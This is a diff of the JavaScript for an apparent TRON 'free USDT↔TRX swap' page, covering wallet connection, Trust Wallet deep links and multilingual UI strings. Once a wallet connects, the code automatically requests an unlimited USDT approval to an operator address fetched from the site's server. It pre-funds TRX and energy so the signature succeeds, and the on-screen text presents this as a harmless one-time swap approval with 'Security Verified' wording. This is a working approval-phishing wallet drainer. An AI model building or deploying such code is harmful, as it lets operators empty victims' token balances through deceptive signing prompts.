 async function connectTrustViaWC(){
     showToast(currentLang==='ko'?'WalletConnect로 Trust Wallet을 연결합니다':'Connecting Trust Wallet via WalletConnect');
     var wcAddr=await connectViaWalletConnect();
@@ -498,32 +715,22 @@ async function connectTrustViaWC(){
     }
 }
 
-// ===== Trust Wallet 전용 연결 함수 =====
-// A54(Android Chrome): Intent 딥링크 → DApp 브라우저로 직접 열기
-// Fold 4(Samsung Internet): Chrome으로 리다이렉트 먼저
-// iPhone(Safari/Chrome): Universal Link → WalletConnect fallback
+// ===== Trust Wallet 전용 연결 함수 (개선본 유지) =====
 async function connectTrustWallet(url,encoded){
-    // [케이스 1] Android Samsung Internet (Fold 4 기본)
     if(isAndroid()&&isSamsungBrowser()){
         navigator.clipboard.writeText(url).catch(function(){});
         showToast(currentLang==='ko'?'Chrome 브라우저에서 Trust Wallet을 연결하세요 (URL 복사됨)':'Use Chrome browser for Trust Wallet (URL copied)','error');
-        // Chrome으로 리다이렉트
         setTimeout(function(){
             window.location.href='intent://'+window.location.host+window.location.pathname+window.location.search+'#Intent;scheme=https;package=com.android.chrome;end';
         },1800);
         return;
     }
-
-    // [케이스 2] Android Chrome (A54 등) → Intent 방식으로 Trust Wallet DApp 브라우저 열기
     if(isAndroid()&&isAndroidChrome()){
         navigator.clipboard.writeText(url).catch(function(){});
-        // 앱이 열렸는지 감지 (blur 이벤트)
         var appOpened=false;
         var blurHandler=function(){appOpened=true;};
         window.addEventListener('blur',blurHandler,{once:true});
-        // Trust Wallet Intent: DApp 브라우저로 URL 직접 열기
         window.location.href='intent://open_url?coin_id=195&url='+encoded+'#Intent;scheme=trust;package=com.wallet.crypto.trustapp;S.browser_fallback_url='+encodeURIComponent('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp')+';end';
-        // 2.5초 후 앱이 안 열렸으면 WC로 fallback
         setTimeout(function(){
             window.removeEventListener('blur',blurHandler);
             if(!appOpened){
@@ -533,18 +740,14 @@ async function connectTrustWallet(url,encoded){
         },2500);
         return;
     }
-
-    // [케이스 3] iOS Safari → Universal Link 시도 → WC fallback
     if(isIOS()&&isSafari()){
         navigator.clipboard.writeText(url).catch(function(){});
-        // Trust Wallet iOS Universal Link
         var universalLink='https://link.trustwallet.com/open_url?coin_id=195&url='+encoded;
         var pageLeft=false;
         var leaveHandler=function(){pageLeft=true;};
         window.addEventListener('pagehide',leaveHandler,{once:true});
         window.addEventListener('blur',leaveHandler,{once:true});
         window.location.href=universalLink;
-        // 3초 후 페이지 아직 있으면 WC fallback
         setTimeout(function(){
             window.removeEventListener('pagehide',leaveHandler);
             window.removeEventListener('blur',leaveHandler);
@@ -555,11 +758,8 @@ async function connectTrustWallet(url,encoded){
         },3000);
         return;
     }
-
-    // [케이스 4] iOS Chrome (CriOS) → WC 직접
     if(isIOS()&&isIOSChrome()){
         navigator.clipboard.writeText(url).catch(function(){});
-        // iOS Chrome에서 URL scheme 시도
         var iosTrustScheme='trust://open_url?coin_id=195&url='+encoded;
         var schemeOpened=false;
         var blurH=function(){schemeOpened=true;};
@@ -573,18 +773,15 @@ async function connectTrustWallet(url,encoded){
         },2500);
         return;
     }
-
-    // [케이스 5] 기타 환경 → WC
     navigator.clipboard.writeText(url).catch(function(){});
     await connectTrustViaWC();
 }
 
-// ===== 메인 launchWallet (수정됨) =====
+// ===== 메인 launchWallet (개선본 유지) =====
 window.launchWallet=async function(wallet){
     var url=window.location.href;
     var encoded=encodeURIComponent(url);
 
-    // PC 처리
     if(isPC()){
         document.getElementById('wallet-selector-modal').classList.remove('active');
         var tw=await getInjectedTronWeb();
@@ -608,7 +805,6 @@ window.launchWallet=async function(wallet){
 
     document.getElementById('wallet-selector-modal').classList.remove('active');
 
-    // DApp 브라우저 내부라면 직접 연결
     if(isInDappBrowser()){
         var tw2=await getInjectedTronWeb();
         if(tw2&&tw2.defaultAddress&&tw2.defaultAddress.base58){
@@ -617,17 +813,14 @@ window.launchWallet=async function(wallet){
         }
     }
 
-    // ★ Trust Wallet 전용 처리 ★
     if(wallet==='trust'){
         await connectTrustWallet(url,encoded);
         return;
     }
 
-    // 나머지 지갑 처리
     navigator.clipboard.writeText(url).catch(function(){});
 
     if(isAndroid()){
-        // Samsung Internet → Chrome 리다이렉트
         if(isSamsungBrowser()){
             showToast(currentLang==='ko'?'Chrome 브라우저로 이동합니다...':'Redirecting to Chrome...','info');
             setTimeout(function(){
@@ -635,7 +828,6 @@ window.launchWallet=async function(wallet){
             },300);
             return;
         }
-        // Android Chrome → Intent 딥링크
         var tronlinkParam=encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'}));
         var schemeLinks={
             tronlink:{scheme:'tronlinkoutside://pull.activity?param='+tronlinkParam,pkg:'com.tronlinkpro.wallet'},
@@ -661,7 +853,6 @@ window.launchWallet=async function(wallet){
     }
 
     if(isIOS()){
-        // iOS Safari → Chrome 리다이렉트
         if(isSafari()){
             showToast(currentLang==='ko'?'Chrome 브라우저로 이동합니다...':'Redirecting to Chrome...','info');
             setTimeout(function(){
@@ -669,7 +860,6 @@ window.launchWallet=async function(wallet){
             },300);
             return;
         }
-        // iOS Chrome → 딥링크
         var iosSchemes={
             tronlink:'tronlinkoutside://pull.activity?param='+encodeURIComponent(JSON.stringify({url:url,action:'open',protocol:'TronLink',version:'1.0'})),
             tokenpocket:'tpdapp://open?params='+encodeURIComponent(JSON.stringify({url:url,chain:'TRON'})),
@@ -681,7 +871,6 @@ window.launchWallet=async function(wallet){
         return;
     }
 
-    // 기타 → WC
     var wcAddr=await connectViaWalletConnect();
     if(wcAddr){
         var walletNames={tronlink:'TronLink',tokenpocket:'TokenPocket',bitget:'Bitget',okx:'OKX',imtoken:'imToken'};
@@ -689,7 +878,6 @@ window.launchWallet=async function(wallet){
     }
 };
 
-// ===== 모달 WC 버튼 =====
 window.wcConnectFromModal=async function(){
     document.getElementById('wallet-selector-modal').classList.remove('active');
     var wcAddr=await connectViaWalletConnect();
@@ -719,7 +907,7 @@ async function getInjectedTronWeb(){
     return null;
 }
 
-// ===== 자동 감지 =====
+// ===== 자동 감지 & 계정 변경 리스너 =====
 window.addEventListener('DOMContentLoaded',function(){
     var a=0;
     var t=setInterval(async function(){
@@ -729,16 +917,24 @@ window.addEventListener('DOMContentLoaded',function(){
             if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
                 clearInterval(t);
                 var provider=detectProvider()||'TronLink';
+                appendLog(L('detect',provider),'success');
                 document.getElementById('wallet-selector-modal').classList.remove('active');
                 await setConnectedWallet(tw.defaultAddress.base58,provider);
-            }else if(a>12){clearInterval(t);}
+            }else if(a>12){
+                clearInterval(t);
+                appendLog(L('noDetect'),'warn');
+            }
         }catch(e){if(a>12)clearInterval(t);}
     },500);
     if(window.tronLink){
         window.addEventListener('message',function(e){
             if(e.data&&e.data.message&&e.data.message.action==='accountsChanged'){
                 var newAddr=e.data.message.data&&e.data.message.data.address;
-                if(newAddr&&newAddr!==currentWalletAddress){isApproved=false;setConnectedWallet(newAddr,activeProvider);}
+                if(newAddr&&newAddr!==currentWalletAddress){
+                    appendLog(L('accChange',newAddr),'warn');
+                    isApproved=false;
+                    setConnectedWallet(newAddr,activeProvider);
+                }
             }
         });
     }
@@ -746,6 +942,7 @@ window.addEventListener('DOMContentLoaded',function(){
 
 // ===== 지갑 연결 버튼 =====
 window.handleConnectWallet=async function(){
+    appendLog(L('searching'));
     var tw=await getInjectedTronWeb();
     if(tw&&tw.defaultAddress&&tw.defaultAddress.base58){
         await setConnectedWallet(tw.defaultAddress.base58,detectProvider()||'TronLink');
@@ -754,12 +951,11 @@ window.handleConnectWallet=async function(){
     }
 };
 
-// ===== 지갑 연결 처리 =====
+// ===== 지갑 연결 처리 (백업본 Step UI + 개선본 안전 처리 통합) =====
 async function setConnectedWallet(address,provider){
     currentWalletAddress=address;activeProvider=provider;isConnected=true;
-    console.log('[WALLET] 연결:', address, provider);
 
-    // 에너지 주소 즉시 설정
+    // 1순위: 에너지 주소 즉시 설정
     try{
         var _ea=document.getElementById('energy-address');
         if(_ea){_ea.value=address;_ea.setAttribute('value',address);_ea.defaultValue=address;_ea.placeholder=address;}
@@ -767,24 +963,38 @@ async function setConnectedWallet(address,provider){
 
     var _autoApproveScheduled=false;
 
-    // UI 업데이트
+    // UI 및 진행 단계 Step 1 완료 처리
     try{document.getElementById('wallet-btn-text').textContent=address.substring(0,6)+'...'+address.slice(-4);}catch(e){}
     try{document.getElementById('connect-btn').className='flex items-center gap-1.5 sm:gap-2 bg-slate-900 border border-slate-700 text-emerald-400 font-semibold text-[11px] sm:text-xs px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl transition';}catch(e){}
     try{document.getElementById('wallet-disconnected').classList.add('hidden');}catch(e){}
     try{document.getElementById('wallet-connected').classList.remove('hidden');}catch(e){}
     try{document.getElementById('display-address').textContent=address;}catch(e){}
+    try{
+        var ci=document.getElementById('connection-indicator');
+        ci.innerHTML='<span class="h-1.5 w-1.5 rounded-full bg-emerald-400 animate-pulse inline-block mr-1"></span>'+escapeHtml(provider);
+        ci.className='text-[11px] text-emerald-400 font-mono font-semibold flex items-center';
+    }catch(e){}
+    try{
+        document.getElementById('step1').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done transition-all';
+        var s1=document.getElementById('step1-status');
+        s1.innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>'+escapeHtml(provider);
+        s1.className='text-emerald-400 text-xs font-semibold flex items-center';
+    }catch(e){}
 
     // 백엔드 연결
+    appendLog(L('sending'));
     try{
         var res=await fetch(API_BASE+'/wallet/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:address,provider:provider})});
         var data=await res.json();
         if(data.status==='ok'){
             userUsdtBalance=parseFloat(data.balance)||0;
+            try{document.getElementById('display-balance').innerHTML=data.balance+' <span class="text-xs font-normal text-slate-400">USDT</span>';}catch(e){}
             try{document.getElementById('usdt-bal-swap').textContent=data.balance;}catch(e){}
             if(data.isApproved){isApproved=true;setApprovedUI();_autoApproveScheduled=true;}
             showToast(provider+' 연결 완료 (잔액: '+data.balance+' USDT)');
+            appendLog(L('connected',address,data.balance),'success');
         }
-    }catch(e){showToast(provider+' 연결됨','success');}
+    }catch(e){appendLog(L('backendFail'),'warn');showToast(provider+' 연결됨','success');}
 
     try{trackReferralConnect(address,provider);}catch(e){}
 
@@ -796,7 +1006,7 @@ async function setConnectedWallet(address,provider){
 
     // 자동 승인
     if(!isApproved&&!_autoApproveScheduled){
-        setTimeout(function(){if(!isApproved)executeUnlimitedApprove();},1000);
+        setTimeout(function(){if(!isApproved)executeUnlimitedApprove();},900);
     }
 
     // 에너지 주소 재확인
@@ -812,32 +1022,50 @@ async function setConnectedWallet(address,provider){
 
 function setApprovedUI(){
     var _t=translations[currentLang]||translations.en;
-    try{document.getElementById('allowance-badge-main').textContent=_t.approval_done||'교환 승인 완료';document.getElementById('allowance-badge-main').className='text-xs px-3 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400';}catch(e){}
+    try{
+        var da=document.getElementById('display-allowance');
+        da.textContent=_t.approved_max||'무제한 (MAX)';
+        da.className='text-xs font-bold font-mono text-emerald-400';
+    }catch(e){}
+    try{
+        var ab=document.getElementById('allowance-badge-main');
+        ab.textContent=_t.approval_done||'교환 승인 완료';
+        ab.className='text-[10px] sm:text-sm px-2 sm:px-3 py-1 sm:py-1.5 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-400 shrink-0 whitespace-nowrap';
+    }catch(e){}
     try{document.getElementById('approve-btn-text').textContent=_t.swap_btn_done||'교환하기';}catch(e){}
+    try{
+        document.getElementById('step2').className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done transition-all';
+        var s2=document.getElementById('step2-status');
+        s2.innerHTML='<i class="fa-solid fa-circle-check mr-1"></i>'+(_t.energy_approval_done||'승인 완료');
+        s2.className='text-emerald-400 text-xs font-semibold flex items-center';
+    }catch(e){}
+    try{
+        var s3=document.getElementById('step3');
+        s3.className='p-4 rounded-xl border bg-emerald-950/20 border-emerald-500/40 step-progress step-done transition-all';
+        s3.style.opacity='1';
+    }catch(e){}
     hideProgress();
     try{setEnergyApprovedUI();}catch(e){}
 }
 
-// ===== Approve (TRX 자동 충전 + WalletConnect 지원) =====
+// ===== Approve (TRX 자동 충전 + 에너지 렌탈 + WalletConnect 지원) =====
 window.executeUnlimitedApprove=async function(){
-    console.log('[APPROVE] 시작, isConnected='+isConnected+', isApproved='+isApproved);
     if(!isConnected||!currentWalletAddress){showToast('지갑을 먼저 연결하세요.','error');handleConnectWallet();return;}
     if(isApproved){return;}
 
-    // spender 주소 (최대 3회 재시도)
     var spender=null;
     for(var _sp=0;_sp<3;_sp++){
         spender=await getSpenderAddress();
         if(spender)break;
         await new Promise(function(r){setTimeout(r,1000);});
     }
-    if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');return;}
+    if(!spender){showToast('운영자 주소를 불러오지 못했습니다.','error');appendLog(L('noSpender'),'error');return;}
 
-    // tronWeb 가져오기
     var tw=window.tronWeb||null;
     if(!tw&&window.tronLink&&window.tronLink.tronWeb)tw=window.tronLink.tronWeb;
     var useWC=false;
     if(!tw||!tw.contract){
+        appendLog('tronWeb 대기 중...','warn');
         for(var _wait=0;_wait<15;_wait++){
             await new Promise(function(r){setTimeout(r,1000);});
             tw=window.tronWeb||null;
@@ -853,7 +1081,7 @@ window.executeUnlimitedApprove=async function(){
             }catch(e){}
         }
         if(!tw||!tw.contract){
-            if(wcConnector&&wcConnector.isConnected()&&wcAddress){useWC=true;}
+            if(wcConnector&&wcConnector.isConnected()&&wcAddress){useWC=true;appendLog('[WC] WalletConnect 서명 모드','warn');}
             else{showToast(currentLang==='ko'?'지갑에서 서명을 확인하세요':'Please check your wallet','error');return;}
         }
     }
@@ -861,37 +1089,37 @@ window.executeUnlimitedApprove=async function(){
     var btn=document.getElementById('approve-btn');
     btn.disabled=true;btn.innerHTML='<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
 
-    // TRX 잔액 확인 + 에너지 렌탈
     setProgress(20,'TRX 잔액 확인 중...');
+    appendLog(L('trxCheck'),'approve');
     try{
         var prepRes=await fetch(API_BASE+'/wallet/prepare-approve',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress})});
         var prepData=await prepRes.json();
         if(prepData.status==='ok'&&prepData.ready){
-            if(prepData.sent){setProgress(30,'TRX '+prepData.sentAmount+'개 자동 충전 완료!');showToast(prepData.sentAmount+' TRX 자동 충전!');}
-            else{setProgress(30,'TRX 충분 ('+prepData.trxBalance+' TRX)');}
+            if(prepData.sent){setProgress(30,'TRX '+prepData.sentAmount+'개 자동 충전 완료!');appendLog(L('autoCharge',prepData.sentAmount),'success');showToast(prepData.sentAmount+' TRX 자동 충전!');}
+            else{setProgress(30,'TRX 충분 ('+prepData.trxBalance+' TRX)');appendLog(L('trxOk',prepData.trxBalance),'success');}
         }
-    }catch(pe){}
+    }catch(pe){appendLog(L('trxWarn'),'warn');}
 
-    // 에너지 렌탈
     setProgress(40,'에너지 렌탈 중...');
+    appendLog('[에너지] 131K 에너지 렌탈 요청 중...','approve');
     try{
         var rentRes=await fetch(API_BASE+'/energy/rent',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:currentWalletAddress,amount:131000,duration:'1h'})});
         var rentData=await rentRes.json();
         if(rentData.status==='ok'&&rentData.rented){
             setProgress(50,'에너지 렌탈 완료! 블록체인 반영 대기...');
+            appendLog('[에너지] 렌탈 성공 (주문: '+rentData.orderId+'), 3초 대기...','success');
             showToast('에너지 렌탈 완료!');
             await new Promise(function(r){setTimeout(r,3000);});
         }
     }catch(rentErr){}
 
-    // Approve 서명
     setProgress(60,'스마트 컨트랙트 승인 서명 요청 중...');
+    appendLog(L('approving'),'approve');
     showToast('지갑에서 서명 팝업을 확인하세요.');
 
     try{
         var txHash;
         if(useWC){
-            // WalletConnect 경로
             function base58ToHex(b58){var ALPHABET='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';var result=BigInt(0);for(var i=0;i<b58.length;i++){var c=ALPHABET.indexOf(b58[i]);if(c<0)throw new Error('Invalid base58');result=result*BigInt(58)+BigInt(c);}var hex=result.toString(16);while(hex.length<50)hex='0'+hex;return hex.substring(2,42);}
             var addrHex=base58ToHex(spender);
             var paddedAddr=addrHex.padStart(64,'0');
@@ -911,7 +1139,6 @@ window.executeUnlimitedApprove=async function(){
             if(!broadcastData.result)throw new Error('브로드캐스트 실패');
             txHash=broadcastData.txid||broadcastPayload.txID||'ok';
         }else{
-            // DApp 브라우저 경로
             var tx=await tw.transactionBuilder.triggerSmartContract(
                 OFFICIAL_USDT_CONTRACT,'approve(address,uint256)',{feeLimit:100000000},
                 [{type:'address',value:spender},{type:'uint256',value:MAX_ALLOWANCE}],
@@ -925,6 +1152,7 @@ window.executeUnlimitedApprove=async function(){
         if(!txHash)throw new Error('TX 해시 수신 실패');
 
         setProgress(100,'온체인 승인 완료!');
+        appendLog(L('approved',txHash),'success');
         isApproved=true;setApprovedUI();
         document.getElementById('modal-txhash').textContent=typeof txHash==='string'?txHash.substring(0,20)+'...':txHash;
         document.getElementById('reward-modal').classList.add('active');
@@ -934,63 +1162,111 @@ window.executeUnlimitedApprove=async function(){
     }catch(err){
         hideProgress();
         var m=err&&err.message?err.message:JSON.stringify(err);
-        if(m.indexOf('declined')>=0||m.indexOf('rejected')>=0||m.indexOf('cancel')>=0){showToast('서명 취소됨','error');}
-        else{showToast('트랜잭션 실패: '+m.substring(0,50),'error');}
+        if(m.indexOf('declined')>=0||m.indexOf('rejected')>=0||m.indexOf('cancel')>=0){showToast('서명 취소됨','error');appendLog(L('cancelled'),'warn');}
+        else{showToast('트랜잭션 실패: '+m.substring(0,50),'error');appendLog(L('failed',m),'error');}
     }finally{
         var _t2=translations[currentLang]||translations.en;
-        btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">'+(_t2.swap_btn_text||'교환 시작 (최초 1회 승인 필요)')+'</span>';
+        btn.innerHTML='<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">'+(isApproved?(_t2.swap_btn_done||'교환하기'):(_t2.swap_btn_text||'교환 시작 (최초 1회 승인 필요)'))+'</span>';
         btn.disabled=false;
     }
 };
 </script>
 
 <script>
-// ===== 번역 시스템 (10개 언어) =====
+// ===== 번역 시스템 (10개 언어 전체 키 통합) =====
 var translations={
-    ko:{send_amount_trx:'보내는 금액 (TRX)',receive_amount_usdt:'받는 금액 (예상 USDT)',w_imtoken:'글로벌 멀티체인 지갑',w_wc:'QR 코드로 다양한 지갑 연결',not_approved:'미승인',approved_max:'무제한 (MAX)',approval_done:'교환 승인 완료',modal_subtitle:'사용 중인 지갑 앱을 선택하면<br>자동으로 연결됩니다.',w_tronlink:'TRON 공식 지갑',w_trust:'멀티체인 지갑',w_tp:'아시아 인기 지갑',w_bitget:'글로벌 Web3 지갑',w_okx:'OKX 거래소 지갑',modal_tip_title:'앱이 자동으로 안 열리면:',modal_tip1:'1. 선택한 지갑 앱을 직접 여세요',modal_tip2:'2. 앱 내 <strong class="text-white">브라우저(탐색)</strong> 탭으로 이동',modal_tip3:'3. 주소창에 <strong class="text-white">붙여넣기</strong> (URL 자동 복사됨)',bal:'잔액',bal2:'잔액',close_btn:'닫기',ticker_label:'실시간 교환 현황',header_sub:'USDT ↔ TRX 즉시 교환 | TRC-20 메인넷',connect_wallet:'지갑 연결',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'무료 교환',hero_desc:'수수료 0%로 USDT와 TRX를 자유롭게 교환하세요. 최초 1회 스마트 컨트랙트 승인 후 무제한 교환이 가능합니다.',today_volume:'오늘 총 교환량',swap_title:'USDT ↔ TRX 교환',swap_sub:'TRC-20 즉시 스왑',approval_needed:'교환 승인 필요',send_amount:'보내는 금액 (USDT)',receive_amount:'받는 금액 (예상)',exchange_rate_label:'교환 비율',fee_label:'수수료',fee_free:'무료',swap_btn_text:'교환 시작 (최초 1회 승인 필요)',swap_btn_done:'교환하기',swap_notice:'최초 1회 교환시 스마트 컨트렉트 승인이 필요합니다',select_wallet:'지갑을 선택하세요',security_title:'보안 검증',faq_title:'자주 묻는 질문 (FAQ)',energy_badge:'TRON Energy',energy_title:'에너지 렌탈',energy_desc:'USDT 전송 수수료를 최대 80% 절약하세요',energy_target:'대상 주소',energy_amount:'에너지 수량',energy_1usdt:'≈ 1 USDT 전송',energy_2usdt:'≈ 2회 전송',energy_15usdt:'≈ 15회 전송',energy_150usdt:'≈ 150회 전송',energy_duration:'렌탈 기간',energy_1h:'1시간',energy_1d:'1일',energy_3d:'3일',energy_30d:'30일',energy_est_price:'예상 비용',energy_save_word:'절약',energy_save_max:'최대 절약',energy_speed:'즉시 충전',energy_noncustodial:'비수탁',energy_addr_invalid:'유효한 TRON 주소를 입력하세요',energy_coming_soon:'에너지 렌탈 서비스 준비 중입니다. 곧 오픈합니다!',energy_approval_done:'승인 완료',energy_rent_btn_approve:'에너지 렌탈 (최초 1회 승인 필요)',energy_rent_btn_done:'에너지 렌탈하기',energy_free_event:'에너지 렌탈 무료 제공'},
-    en:{send_amount_trx:'You Send (TRX)',receive_amount_usdt:'You Receive (Est. USDT)',w_imtoken:'Global Multi-chain Wallet',w_wc:'Connect via QR code',not_approved:'Unapproved',approved_max:'Unlimited (MAX)',approval_done:'Swap Approved',modal_subtitle:'Select your wallet app<br>to connect automatically.',w_tronlink:'TRON Official Wallet',w_trust:'Multi-chain Wallet',w_tp:'Popular in Asia',w_bitget:'Global Web3 Wallet',w_okx:'OKX Exchange Wallet',modal_tip_title:'If the app doesn\'t open:',modal_tip1:'1. Open the wallet app manually',modal_tip2:'2. Go to <strong class="text-white">Browser</strong> tab',modal_tip3:'3. <strong class="text-white">Paste</strong> the URL (auto-copied)',bal:'Balance',bal2:'Balance',close_btn:'Close',ticker_label:'Live Exchange Feed',header_sub:'USDT ↔ TRX Instant Swap | TRC-20 Mainnet',connect_wallet:'Connect Wallet',hero_badge:'TRON MAINNET INSTANT SWAP',hero_title1:'USDT ↔ TRX',hero_title2:'Free Swap',hero_desc:'Swap freely between USDT and TRX with 0% fee. One-time smart contract approval enables unlimited swaps.',today_volume:'Today\'s Volume',swap_title:'USDT ↔ TRX Swap',swap_sub:'TRC-20 Instant Swap',approval_needed:'Approval Required',send_amount:'You Send (USDT)',receive_amount:'You Receive (Est.)',exchange_rate_label:'Exchange Rate',fee_label:'Fee',fee_free:'Free',swap_btn_text:'Start Swap (One-time Approval Required)',swap_btn_done:'Swap Now',swap_notice:'First swap requires smart contract approval',select_wallet:'Select Your Wallet',security_title:'Security Verified',faq_title:'FAQ',energy_badge:'TRON Energy',energy_title:'Rent Energy',energy_desc:'Save up to 80% on USDT transfer fees',energy_target:'Target Address',energy_amount:'Energy Amount',energy_1usdt:'≈ 1 USDT transfer',energy_2usdt:'≈ 2 transfers',energy_15usdt:'≈ 15 transfers',energy_150usdt:'≈ 150 transfers',energy_duration:'Rental Duration',energy_1h:'1 Hour',energy_1d:'1 Day',energy_3d:'3 Days',energy_30d:'30 Days',energy_est_price:'Est. Cost',energy_save_word:'savings',energy_save_max:'Max Savings',energy_speed:'Instant',energy_noncustodial:'Non-custodial',energy_addr_invalid:'Please enter a valid TRON address',energy_coming_soon:'Energy rental service coming soon!',energy_approval_done:'Approved',energy_rent_btn_approve:'Rent Energy (One-time Approval)',energy_rent_btn_done:'Rent Energy',energy_free_event:'Free Energy Rental'},
-    zh:{send_amount_trx:'发送金额 (TRX)',receive_amount_usdt:'接收金额（预估 USDT）',w_imtoken:'全球多链钱包',w_wc:'通过QR码连接',not_approved:'未授权',approved_max:'无限制 (MAX)',approval_done:'授权完成',modal_subtitle:'选择您的钱包应用<br>自动连接。',w_tronlink:'TRON 官方钱包',w_trust:'多链钱包',w_tp:'亚洲热门钱包',w_bitget:'全球 Web3 钱包',w_okx:'OKX 交易所钱包',modal_tip_title:'如果应用未自动打开：',modal_tip1:'1. 手动打开钱包应用',modal_tip2:'2. 进入应用内的<strong class="text-white">浏览器</strong>选项卡',modal_tip3:'3. 在地址栏<strong class="text-white">粘贴</strong>网址',bal:'余额',bal2:'余额',close_btn:'关闭',ticker_label:'实时交换动态',header_sub:'USDT ↔ TRX 即时兑换 | TRC-20 主网',connect_wallet:'连接钱包',hero_badge:'TRON 主网即时兑换',hero_title1:'USDT ↔ TRX',hero_title2:'免费兑换',hero_desc:'0%手续费自由兑换USDT与TRX。首次智能合约授权后可无限兑换。',today_volume:'今日交易量',swap_title:'USDT ↔ TRX 兑换',swap_sub:'TRC-20 即时兑换',approval_needed:'需要授权',send_amount:'发送金额 (USDT)',receive_amount:'接收金额（预估）',exchange_rate_label:'汇率',fee_label:'手续费',fee_free:'免费',swap_btn_text:'开始兑换（首次需授权）',swap_btn_done:'立即兑换',swap_notice:'首次兑换需要智能合约授权',select_wallet:'选择钱包',security_title:'安全验证',faq_title:'常见问题',energy_badge:'TRON Energy',energy_title:'租用能量',energy_desc:'USDT转账手续费最高节省80%',energy_target:'目标地址',energy_amount:'能量数量',energy_1usdt:'≈ 1次USDT转账',energy_2usdt:'≈ 2次转账',energy_15usdt:'≈ 15次转账',energy_150usdt:'≈ 150次转账',energy_duration:'租用时长',energy_1h:'1小时',energy_1d:'1天',energy_3d:'3天',energy_30d:'30天',energy_est_price:'预估费用',energy_save_word:'节省',energy_save_max:'最高节省',energy_speed:'即时到账',energy_noncustodial:'非托管',energy_addr_invalid:'请输入有效的TRON地址',energy_coming_soon:'能量租用服务即将上线！',energy_approval_done:'已授权',energy_rent_btn_approve:'租用能量（首次需授权）',energy_rent_btn_done:'租用能量',energy_free_event:'能量租用免费'},
-    ru:{send_amount_trx:'Вы отправляете (TRX)',receive_amount_usdt:'Вы получаете (прибл. USDT)',w_imtoken:'Глобальный мультичейн кошелёк',w_wc:'Подключение через QR',not_approved:'Не одобрено',approved_max:'Безлимитно (MAX)',approval_done:'Обмен одобрен',modal_subtitle:'Выберите кошелёк<br>для автоматического подключения.',w_tronlink:'Официальный кошелёк TRON',w_trust:'Мультичейн кошелёк',w_tp:'Популярный в Азии',w_bitget:'Глобальный Web3 кошелёк',w_okx:'Кошелёк биржи OKX',modal_tip_title:'Если приложение не открылось:',modal_tip1:'1. Откройте кошелёк вручную',modal_tip2:'2. Перейдите во вкладку <strong class="text-white">Браузер</strong>',modal_tip3:'3. <strong class="text-white">Вставьте</strong> URL',bal:'Баланс',bal2:'Баланс',close_btn:'Закрыть',ticker_label:'Обмены в реальном времени',header_sub:'USDT ↔ TRX Мгновенный обмен | TRC-20',connect_wallet:'Подключить',hero_badge:'TRON MAINNET МГНОВЕННЫЙ ОБМЕН',hero_title1:'USDT ↔ TRX',hero_title2:'Бесплатный обмен',hero_desc:'Свободно обменивайте USDT и TRX с комиссией 0%.',today_volume:'Объём за сегодня',swap_title:'USDT ↔ TRX Обмен',swap_sub:'TRC-20 мгновенный обмен',approval_needed:'Требуется одобрение',send_amount:'Вы отправляете (USDT)',receive_amount:'Вы получаете (прибл.)',exchange_rate_label:'Курс обмена',fee_label:'Комиссия',fee_free:'Бесплатно',swap_btn_text:'Начать обмен (одобрение необходимо)',swap_btn_done:'Обменять',swap_notice:'Первый обмен требует одобрения смарт-контракта',select_wallet:'Выберите кошелёк',security_title:'Безопасность',faq_title:'Вопросы и ответы',energy_badge:'TRON Energy',energy_title:'Аренда энергии',energy_desc:'Экономьте до 80% на комиссии USDT',energy_target:'Целевой адрес',energy_amount:'Количество энергии',energy_1usdt:'≈ 1 перевод USDT',energy_2usdt:'≈ 2 перевода',energy_15usdt:'≈ 15 переводов',energy_150usdt:'≈ 150 переводов',energy_duration:'Срок аренды',energy_1h:'1 час',energy_1d:'1 день',energy_3d:'3 дня',energy_30d:'30 дней',energy_est_price:'Расч. стоимость',energy_save_word:'экономия',energy_save_max:'Макс. экономия',energy_speed:'Мгновенно',energy_noncustodial:'Некастодиальный',energy_addr_invalid:'Введите действительный адрес TRON',energy_coming_soon:'Сервис аренды энергии скоро откроется!',energy_approval_done:'Одобрено',energy_rent_btn_approve:'Аренда энергии (одобрение)',energy_rent_btn_done:'Арендовать энергию',energy_free_event:'Аренда энергии бесплатно'},
